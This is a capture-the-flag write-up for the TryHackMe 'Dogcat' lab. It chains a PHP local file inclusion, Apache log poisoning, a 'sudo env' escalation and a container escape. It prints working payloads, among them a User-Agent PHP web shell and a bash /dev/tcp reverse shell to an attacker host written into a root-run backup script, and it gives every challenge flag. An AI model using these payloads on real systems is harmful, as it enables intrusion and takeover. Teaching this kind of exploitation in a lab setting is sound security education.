# Dogcat — TryHackMe Writeup

**Room:** [Dogcat](https://tryhackme.com/room/dogcat)

## Executive Summary

**Dogcat** is a web exploitation and privilege-escalation challenge built around a deliberately vulnerable PHP application.

The attack chain is:

**Web enumeration → LFI → PHP source disclosure → Apache log poisoning → RCE → user shell → `sudo env` → root → container escape via writable backup script**

The most important lesson is how several individually small weaknesses can be chained together. The application attempts to restrict file inclusion to paths containing `dog` or `cat`, but the validation is performed only as a substring check. A separate `ext` parameter then allows the normal `.php` extension to be removed, turning the LFI into a much more useful primitive.

From there, the Apache access log can be poisoned with PHP code through the `User-Agent` header. Including that log causes PHP to interpret the injected code, giving command execution as `www-data`.

The remaining stages demonstrate two different escalation concepts: abusing an overly permissive `sudo` rule and then escaping the container by exploiting a root-run backup script.

---

# 1. Reconnaissance

I started with a full Nmap scan:

```bash
nmap <IP> -A -T4
```

The important results were:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.38 (Debian)
```

So the attack surface was initially very small:

- **22/tcp** — SSH
    
- **80/tcp** — HTTP
    

The web server was clearly the main target.

---

# 2. Web Enumeration

Next, I used `ffuf` to search for common files and directories, including PHP and text files:

```bash
ffuf -u http://<IP>/FUZZ \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-e .php,.txt \
-t 100 \
-c
```

The scan returned several interesting paths:

```text
cat.php
dog.php
flag.php
cats/
dogs/
server-status
```

The three most interesting discoveries were:

- `cat.php`
    
- `dog.php`
    
- `flag.php`
    

The application was clearly built around displaying either cat or dog images, so the next thing to investigate was how those files were being selected.

---

# 3. Flag 1 — PHP Source Disclosure

The application uses a `view` parameter to determine which file gets included.

The interesting part is that the application requires the supplied path to contain either the string `cat` or `dog`.

That restriction can be abused with PHP's `php://filter` wrapper.

For example:

```text
http://<IP>/?view=php://filter/convert.base64-encode/resource=cats/../flag
```

The `cats/../` portion is useful because the application sees the required `cat` substring, while the filesystem resolves the path to the actual `flag.php` file.

Because PHP source code would normally be interpreted rather than displayed, the `convert.base64-encode` filter lets us retrieve the source safely as Base64.

After decoding the response, the flag was:

```text
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```

### Flag 1

> `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

---

# 4. Understanding the LFI

The next objective was to understand exactly how the application's inclusion mechanism worked.

Using the same technique, I retrieved the source of `index.php`:

```text
http://<IP>/?view=php://filter/convert.base64-encode/resource=cats/../index
```

After decoding it, the important logic looked like this:

```php
function containsStr($str, $substr)
{
    return strpos($str, $substr) !== false;
}

$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';

if (isset($_GET['view']))
{
    if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))
    {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    }
    else
    {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

There are two important weaknesses here.

### Weakness 1 — Weak filename validation

The application doesn't verify that the requested file is actually a legitimate cat or dog file.

It simply checks whether the string contains:

```text
dog
```

or:

```text
cat
```

So a path such as:

```text
cats/../../../../var/log/apache2/access.log
```

passes the filter.

### Weakness 2 — Controllable extension

The application normally appends:

```text
.php
```

to the supplied path.

However, the `ext` parameter controls that value.

Setting:

```text
ext=
```

means the application effectively performs:

```php
include $_GET['view'];
```

This makes it possible to include files that aren't PHP files.

That combination gives us a practical **Local File Inclusion (LFI)** primitive.

---

# 5. Flag 2 — Apache Log Poisoning → RCE

The next question was whether the Apache access log could be included.

I tested:

```text
http://<IP>/?view=cats/../../../../var/log/apache2/access.log&ext=
```

The log was successfully included.

That is where **log poisoning** becomes useful.

Apache records the `User-Agent` header in its access log. If PHP code can be inserted into that header, and the resulting log is subsequently included as PHP, the interpreter may execute the injected code.

## Injecting PHP into the log

Using Burp Suite, I intercepted a request and changed the `User-Agent` header to:

```php
<?php system($_GET['cmd']);?>
```

The important request looked like:

```http
GET /?view=cats/../../../../var/log/apache2/access.log&ext HTTP/1.1
Host: <IP>
User-Agent: <?php system($_GET['cmd']);?>
```

The malicious header is now stored inside Apache's access log.

When the application includes that log file, PHP processes the injected code.

---

## Confirming command execution

I then supplied a command through the `cmd` parameter:

```text
http://<IP>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

The response contained:

```text
www-data
```

So we had successfully turned:

**LFI → log poisoning → PHP execution → command execution**

At this point the application was executing commands as the web-server account.

---

# 6. Obtaining a Shell

With command execution confirmed, the next step was to establish a reverse shell.

I prepared a listener on my machine and supplied a URL-encoded PHP command through the `cmd` parameter.

The resulting shell connected back as:

```text
www-data
```

The shell can optionally be upgraded to a more usable interactive terminal:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

Then:

```text
Ctrl+Z
```

```bash
stty raw -echo; fg
reset
export TERM=xterm
```

The important point isn't the shell upgrade itself — it's that the LFI had now become genuine remote command execution.

---

# 7. Flag 2

The second flag was located at:

```text
/var/www/flag2_QMW7JvaY2LvK.txt
```

Reading that file gave:

```text
THM{LF1_t0_RC3_aec3fb}
```

### Flag 2

> `THM{LF1_t0_RC3_aec3fb}`

---

# 8. Privilege Escalation — `sudo env`

Now that we had a shell as `www-data`, I checked the account's sudo permissions:

```bash
sudo -l
```

The important result was that `/usr/bin/env` could be executed with elevated privileges without requiring a password.

This is significant because `env` can be used to execute another program.

Therefore:

```bash
sudo env /bin/sh
```

gave an elevated shell.

Checking the identity:

```bash
id
```

confirmed that we were now operating as:

```text
root
```

No conventional kernel exploit or password cracking was necessary; the escalation came directly from the unsafe sudo configuration.

---

# 9. Flag 3

The root flag was located at:

```text
/root/flag3.txt
```

Reading it produced:

```text
THM{D1ff3r3nt_3nv1ronments_874112}
```

### Flag 3

> `THM{D1ff3r3nt_3nv1ronments_874112}`

---

# 10. Container Enumeration

Getting root inside the current environment wasn't necessarily the end of the machine.

I checked the container configuration:

```bash
cat /proc/1/cgroup
```

The output contained Docker paths such as:

```text
/docker/074345efe45be5a85cc5249b7ed59997430165881b15a8a5196c643ff17f68dd
```

This confirmed that the shell was running inside a Docker container.

That changed the objective: instead of simply looking for another local privilege escalation, I needed to investigate how the container interacted with the underlying host.

---

# 11. Finding the Backup Mechanism

I ran a Linux enumeration script to identify unusual files and processes.

One particularly interesting file was:

```text
/opt/backups/backup.sh
```

Its timestamp was changing repeatedly.

That is a major clue.

A script whose contents can potentially be modified while another process periodically executes it creates a classic **scheduled-task / writable-script privilege-escalation condition**.

The important questions were:

1. Who owns the script?
    
2. Who executes it?
    
3. Can our current user modify it?
    
4. How frequently is it executed?
    

In this challenge, the backup mechanism provided the route toward the final stage.

---

# 12. Container Escape

The backup script was modified so that when the privileged backup process executed it, it would establish a shell connection back to the attacking machine.

For the challenge environment, the replacement script was:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

With a listener running on the attacking machine, the scheduled backup execution triggered the connection.

This moved the attack beyond the original web application and into the host/container boundary.

---

# 13. Flag 4

The final flag was located at:

```text
/root/flag4.txt
```

The contents were:

```text
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

### Flag 4

> `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

---

# Attack Chain

The entire machine can be reduced to this:

```text
Web enumeration
      ↓
PHP source disclosure
      ↓
Weak cat/dog validation
      ↓
Local File Inclusion
      ↓
Apache access-log inclusion
      ↓
Log poisoning through User-Agent
      ↓
PHP code execution
      ↓
Reverse shell as www-data
      ↓
sudo -l
      ↓
sudo env /bin/sh
      ↓
Root inside Docker
      ↓
Container enumeration
      ↓
Writable/frequently executed backup script
      ↓
Final escalation
      ↓
Flag 4
```

---

# Key Lessons

### 1. Never treat substring checks as path validation

This:

```php
strpos($str, 'cat')
```

doesn't establish that the requested file is actually a cat-related resource.

Proper validation should use strict allowlists and safe path handling.

### 2. LFI becomes much more dangerous when non-PHP files can be included

The controllable `ext` parameter was particularly important. It removed the application's normal `.php` suffix and allowed files such as Apache logs to become inclusion targets.

### 3. Log files are potentially executable input

Apache logs normally contain attacker-controlled HTTP data. If an application subsequently passes that log through a PHP interpreter, those supposedly harmless strings can become executable code.

### 4. Check `sudo -l` after obtaining a shell

Before looking for complicated exploits, always inspect the current account's sudo permissions:

```bash
sudo -l
```

Here, the escalation was already sitting in the system configuration.

### 5. Root inside a container isn't necessarily the end

After obtaining root, always understand the environment:

```bash
cat /proc/1/cgroup
```

Containerization changes what "root" actually means and can introduce an additional attack surface through mounts, scheduled jobs, exposed sockets, writable host-linked files, and poorly isolated services.

### 6. Watch for unusual file timestamps

A file that is repeatedly modified or executed can reveal a scheduled process worth investigating. In this machine, the changing backup script was the clue leading to the final stage.

---

# Flags

|Stage|Flag|
|---|---|
|**Flag 1**|`THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`|
|**Flag 2**|`THM{LF1_t0_RC3_aec3fb}`|
|**Flag 3**|`THM{D1ff3r3nt_3nv1ronments_874112}`|
|**Flag 4**|`THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`|

**Overall lesson:** Dogcat is a great example of why web vulnerabilities should be viewed as an attack chain rather than isolated bugs. A weak filename check creates LFI, LFI exposes the Apache log, log poisoning turns that into RCE, a bad sudo rule turns RCE into root, and the container's backup mechanism provides the final escalation.